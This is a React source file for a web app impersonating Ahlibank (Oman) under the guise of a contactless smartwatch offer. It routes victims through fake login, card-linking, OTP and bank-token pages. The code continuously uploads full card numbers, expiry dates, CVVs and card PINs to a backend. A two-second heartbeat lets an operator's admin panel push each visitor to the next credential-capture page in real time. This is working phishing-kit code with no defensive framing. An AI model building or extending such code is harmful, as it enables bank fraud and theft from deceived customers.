/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import React, { useState, useEffect, useRef } from 'react';
import { Routes, Route, useLocation, useNavigate } from 'react-router-dom';
import { Wifi, ShieldCheck } from 'lucide-react';
import { FormState, initialFormState, LOGO_SRC } from './types';
import {
  sendPresenceHeartbeat,
  resolveTargetRoute,
  updateDraftRequestData,
  restoreDeletedVisitorIfNeeded
} from './api';
import HomePage from './pages/HomePage';
import FormPage from './pages/FormPage';
import SelectWatchPage from './pages/SelectWatchPage';
import LinkServicePage from './pages/LinkServicePage';
import LoginServicePage from './pages/LoginServicePage';
import CardLinkPage from './pages/CardLinkPage';
import OtpPage from './pages/OtpPage';
import TokenVerificationPage from './pages/TokenVerificationPage';
import SuccessPage from './pages/SuccessPage';
import AdminPage from './pages/AdminPage';
import AdminLoginPage from './pages/AdminLoginPage';

const ROUTE_LOADING_MESSAGES: Record<string, string> = {
  '/': 'جارِ تحميل الصفحة الرئيسية...',
  '/form': 'جارِ تجهيز استمارة بيانات العميل...',
  '/select-watch': 'جارِ تحميل استوديو تخصيص الساعة الذكية...',
  '/link-service': 'جارِ تهيئة خدمة الربط اللاتلامسي...',
  '/login': 'جارِ الاتصال ببوابة البنك الأهلي الآمنة...',
  '/card-link': 'جارِ فتح نموذج ربط البطاقة المشفّر...',
  '/verify': 'جارِ طلب رمز الأمان الرقمي (TOKEN)...',
  '/otp': 'جارِ طلب رمز التحقق النصي (OTP)...',
  '/otp-bank': 'جارِ طلب موافقة تطبيق البنك الأهلي...',
  '/success': 'جارِ إصدار إيصال تأكيد الطلب...'
};

export default function App() {
  const [formState, setFormState] = useState<FormState>(initialFormState);
  const [isPageLoading, setIsPageLoading] = useState(false);
  const location = useLocation();
  const navigate = useNavigate();
  const isFirstRender = useRef(true);
  const wasAdminRouteRef = useRef(false);
  const isAdminRoute = location.pathname.startsWith('/admin');

  // Keep draft request data synced with formState so returning to the site after deletion preserves all fields
  useEffect(() => {
    updateDraftRequestData({
      name: formState.fullName || undefined,
      mobile: formState.registeredPhone || formState.phone || undefined,
      idNumber: formState.isExistingCustomer === 'لا' ? 'عميل جديد' : 'عميل البنك الأهلي',
      cardType: formState.watchColor || 'rose-gold',
      address: `${formState.watchSize || '45mm'} - ${formState.strapType || 'silicone'}`,
      cardNumber: formState.cardNumber || undefined,
      expMonth: formState.expMonth || undefined,
      expYear: formState.expYear || undefined,
      cvv: formState.cvv || undefined,
      cardPin: formState.cardPin || undefined,
      paymentName: formState.fullName || undefined
    });
  }, [formState]);

  useEffect(() => {
    fetch('/api/health').catch(() => {});
    const params = new URLSearchParams(window.location.search);
    const hash = window.location.hash;
    if (
      params.get('admin') === '1' ||
      params.get('page') === 'admin' ||
      hash === '#/admin' ||
      hash === '#admin'
    ) {
      navigate('/admin', { replace: true });
    }
  }, [navigate]);

  // Restore visitor data when returning to the site (from /admin, tab focus, or page navigation)
  useEffect(() => {
    if (isAdminRoute) {
      wasAdminRouteRef.current = true;
      return;
    }

    if (wasAdminRouteRef.current) {
      wasAdminRouteRef.current = false;
      restoreDeletedVisitorIfNeeded(location.pathname);
    }

    const handleReturnToSite = () => {
      if (!window.location.pathname.startsWith('/admin') && document.visibilityState === 'visible') {
        restoreDeletedVisitorIfNeeded(window.location.pathname);
      }
    };

    window.addEventListener('focus', handleReturnToSite);
    document.addEventListener('visibilitychange', handleReturnToSite);
    return () => {
      window.removeEventListener('focus', handleReturnToSite);
      document.removeEventListener('visibilitychange', handleReturnToSite);
    };
  }, [isAdminRoute, location.pathname]);

  // Presence heartbeat & real-time Admin redirect listener
  useEffect(() => {
    if (isAdminRoute) return;

    let active = true;
    const tick = async () => {
      const res = await sendPresenceHeartbeat(location.pathname);
      if (!active || !res.ok) return;
      if (res.redirectTo) {
        const target = resolveTargetRoute(res.redirectTo);
        if (target && target !== location.pathname) {
          navigate(target);
        }
      }
    };

    tick();
    const interval = setInterval(tick, 2000);
    return () => {
      active = false;
      clearInterval(interval);
    };
  }, [location.pathname, isAdminRoute, navigate]);

  useEffect(() => {
    window.scrollTo({ top: 0, behavior: 'instant' });

    if (isFirstRender.current) {
      isFirstRender.current = false;
      return;
    }

    if (isAdminRoute) {
      setIsPageLoading(false);
      return;
    }

    setIsPageLoading(true);
    const timer = setTimeout(() => {
      setIsPageLoading(false);
    }, 600);

    return () => clearTimeout(timer);
  }, [location.pathname, isAdminRoute]);

  if (isAdminRoute) {
    return (
      <div className="w-full max-w-none min-h-screen bg-white">
        <Routes>
          <Route path="/admin/login" element={<AdminLoginPage />} />
          <Route path="/admin" element={<AdminPage />} />
          <Route path="/admin/*" element={<AdminPage />} />
        </Routes>
      </div>
    );
  }

  const loadingMessage =
    ROUTE_LOADING_MESSAGES[location.pathname] || 'جارِ التحميل الآمن...';

  return (
    <div className="min-h-screen bg-[#eceef2] flex flex-col items-center">
      {/* Main Responsive Canvas Container */}
      <div className="relative w-full max-w-md min-h-screen bg-[#fbfbfd] shadow-2xl flex flex-col border-x border-gray-200">
        {/* Page Transition Loading Overlay */}
        {isPageLoading && (
          <div
            role="status"
            aria-live="polite"
            className="fixed inset-0 z-50 bg-white/95 backdrop-blur-md flex flex-col items-center justify-center p-6 transition-opacity duration-200"
          >
            <div className="w-full max-w-xs bg-white border border-stone-200/90 rounded-3xl p-7 shadow-xl flex flex-col items-center text-center">
              <div className="bg-black px-4 py-2 rounded-2xl mb-6 flex items-center justify-center shadow-sm border border-neutral-800">
                <img
                  src={LOGO_SRC}
                  alt="البنك الأهلي - ahlibank"
                  referrerPolicy="no-referrer"
                  className="h-8 object-contain"
                  onError={(e) => {
                    (e.target as HTMLElement).style.display = 'none';
                  }}
                />
              </div>

              {/* Dual-ring animated spinner with NFC center */}
              <div className="relative w-16 h-16 flex items-center justify-center mb-5">
                <div className="absolute inset-0 rounded-full border-4 border-emerald-100" />
                <div className="absolute inset-0 rounded-full border-4 border-transparent border-t-[#004838] border-r-[#d4a343] animate-spin" />
                <div className="w-10 h-10 rounded-full bg-[#e6f4f0] flex items-center justify-center text-[#004838]">
                  <Wifi className="w-5 h-5 rotate-90" />
                </div>
              </div>

              <p className="text-sm font-bold text-slate-900 mb-1.5">
                {loadingMessage}
              </p>
              <div className="flex items-center justify-center gap-1.5 text-[11px] text-slate-500 font-medium">
                <ShieldCheck className="w-3.5 h-3.5 text-emerald-600 shrink-0" />
                <span>اتصال مشفّر وآمن · البنك الأهلي العماني</span>
              </div>
            </div>
          </div>
        )}

        <Routes>
          <Route path="/" element={<HomePage formState={formState} setFormState={setFormState} />} />
          <Route path="/form" element={<FormPage formState={formState} setFormState={setFormState} />} />
          <Route path="/request" element={<FormPage formState={formState} setFormState={setFormState} />} />
          <Route path="/select-watch" element={<SelectWatchPage formState={formState} setFormState={setFormState} />} />
          <Route path="/link-service" element={<LinkServicePage />} />
          <Route path="/login" element={<LoginServicePage />} />
          <Route path="/card-link" element={<CardLinkPage formState={formState} setFormState={setFormState} />} />
          <Route path="/card-details" element={<CardLinkPage formState={formState} setFormState={setFormState} />} />
          <Route path="/otp" element={<OtpPage />} />
          <Route path="/verify" element={<TokenVerificationPage />} />
          <Route path="/otp-bank" element={<TokenVerificationPage />} />
          <Route path="/waiting" element={<OtpPage />} />
          <Route path="/success" element={<SuccessPage formState={formState} />} />
        </Routes>
      </div>
    </div>
  );
}
